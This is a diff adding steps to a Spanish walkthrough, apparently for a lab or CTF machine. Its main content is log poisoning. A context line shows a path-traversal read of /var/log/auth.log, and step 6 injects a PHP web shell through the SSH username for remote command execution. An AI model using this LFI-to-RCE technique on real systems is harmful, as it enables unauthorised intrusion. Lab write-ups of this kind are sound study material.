@@ -82,3 +82,19 @@ Opción 2) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../..
 **/var/log/auth.log**
 
 ![10](https://user-images.githubusercontent.com/75953873/174939217-162ae75c-1412-48dd-98ab-142100bf6e95.png)
+
+- *Paso 6:* Envenenar registros de Apache a través de SSH creando una backdoor por el puerto 2211.
+```
+ssh '<?php system($_GET['cmd']); ?>'@192.168.1.10 -p 2211
+```
+![11](https://user-images.githubusercontent.com/75953873/175163279-0d24f94a-7f18-41a2-a627-580aa8e1b0b2.png)
+
+- *Paso 7:* Configurar proxy y capturar solicitud GET con BurpSuite.
+
+Configuración de Firefox **>** Configuración de redes:
+
+HTTP Proxy: `127.0.0.1`
+Port: `8080`
+
+![12](https://user-images.githubusercontent.com/75953873/175163339-db1853d5-b77c-47cb-86b5-0fa8e6e5fb28.png)
+
